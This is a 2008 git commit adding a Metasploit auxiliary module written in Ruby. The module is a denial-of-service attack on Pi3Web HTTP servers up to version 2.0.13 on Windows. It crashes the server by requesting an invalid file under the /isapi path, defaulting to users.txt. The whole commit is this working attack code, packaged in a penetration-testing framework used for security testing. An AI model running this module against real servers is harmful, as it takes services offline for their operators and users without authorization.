85a9db3bad5245536de1718811eb4a2b6bda1767
kris <>
2008-11-16 04:35:47 +0000

    add DoS aux module for Pi3Web <=2.0.13 on Windows
    git-svn-id: file:///home/svn/framework3/trunk@5924 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/auxiliary/dos/windows/http/pi3web_isapi.rb
@@ -0,0 +1,42 @@
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'Pi3Web <=2.0.13 ISAPI DoS',
+			'Description'    => %q{
+				The Pi3Web HTTP server crashes when a request is made
+				for an invalid DLL file in /isapi.  By default, the
+				non-DLLs in this directory after installation are
+				users.txt, install.daf and readme.daf.
+			},
+			'Author'         => 'Kris Katterjohn <katterjohn@gmail.com>',
+			'License'        => MSF_LICENSE,
+			'Version'        => '1',
+			'References'     => [
+				[ 'URL', 'http://milw0rm.com/exploits/7109' ]
+			],
+			'DisclosureDate' => 'Nov 13 2008'))
+
+		register_options([
+			OptString.new('FILENAME', [ true, 'File in /isapi to request', 'users.txt' ])
+		])
+	end
+
+	def run
+		begin
+			o = { 'uri' => "/isapi/#{datastore['FILENAME']}" }
+
+			c = connect(o)
+			c.send_request(c.request_raw(o))
+
+			print_status("Request sent to #{rhost}:#{rport}")
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			print_status("Couldn't connect to #{rhost}:#{rport}")
+		rescue ::Timeout::Error, ::Errno::EPIPE			
+		end
+	end
+end
